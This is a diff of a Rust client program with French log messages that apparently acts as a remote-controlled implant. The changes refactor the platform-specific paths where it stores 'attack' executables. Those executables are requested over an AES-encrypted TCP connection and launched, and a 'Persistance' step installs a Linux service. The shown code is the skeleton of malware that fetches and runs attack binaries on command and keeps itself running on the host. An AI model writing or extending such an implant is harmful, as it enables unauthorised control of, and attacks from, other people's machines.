@@ -17,7 +17,7 @@ use serde::{Deserialize, Serialize};
 use generic_array::GenericArray;
 use base64::{Engine as _, engine::general_purpose};
 use std::fs::{self, File};
-use std::path::Path;
+use std::path::{Path, PathBuf};
 
 type Aes128CbcEnc = cbc::Encryptor<aes::Aes128>;
 type Aes128CbcDec = cbc::Decryptor<aes::Aes128>;
@@ -28,6 +28,7 @@ use std::thread;
 
 use std::io::prelude::*;
 use base64::prelude::*;
+
 
 #[cfg(client_os = "linux")]
 use std::os::unix::fs::PermissionsExt;
@@ -332,18 +333,22 @@ fn execute_attack(
     stream: &TcpStream,
 ) ->  io::Result<String> {
     
-    #[cfg(client_os = "linux")]
-    let executable_dir = "/etc/actions";
-    #[cfg(client_os = "windows")]
-    let executable_dir = "./actions";
- 
+    let executable_dir: &str;
+    let executable_path: PathBuf;
+
+    if cfg!(client_os = "windows"){
+        executable_dir = "./actions";
+    }else{
+        executable_dir = "/etc/actions";
+    }
+     
     check_and_request_executable(attack_name, executable_dir, symetric_key, iv, stream)?;
 
-    #[cfg(client_os = "windows")]
-    let executable_path = Path::new(executable_dir).join(attack_name).with_extension("exe");
-
-    #[cfg(client_os = "linux")]
-    let executable_path = Path::new(executable_dir).join(attack_name);
+    if cfg!(client_os = "windows"){
+        executable_path = Path::new(executable_dir).join(attack_name).with_extension("exe");
+    }else{
+        executable_path = Path::new(executable_dir).join(attack_name);
+    }
 
     // Run the executable with argument `10` and capture the output
     println!("[+] Lancement de l'attaque: {}", attack_name);
@@ -490,8 +495,16 @@ fn check_service()-> bool{
 }
 
 fn create_action_dir(){
-    println!("creation");
-    let path = "/etc/actions";
+
+    let path;
+
+    if cfg!(target_os = "windows") {
+        path = "./actions";
+    } else {
+        path = "/etc/actions/";
+    }
+
+    println!("[+] Création du dossier actions path: {}", path);
     match fs::create_dir(path){
         Ok(_) => {
             println!("[+] Dossier actions créé");
@@ -505,8 +518,6 @@ fn create_action_dir(){
 
 fn main() -> io::Result<()> {
 
-    
-
     if cfg!(client_os = "linux"){
         // Persistance
         if check_service(){
@@ -517,10 +528,9 @@ fn main() -> io::Result<()> {
         }
     }
 
-    //vérifie si le dossier actions existe
-    if !Path::new("/etc/actions").exists(){
-        create_action_dir();
-    }
+    // Création du dossier actions
+    create_action_dir();
+
     
 
     let mut connected: bool = false;
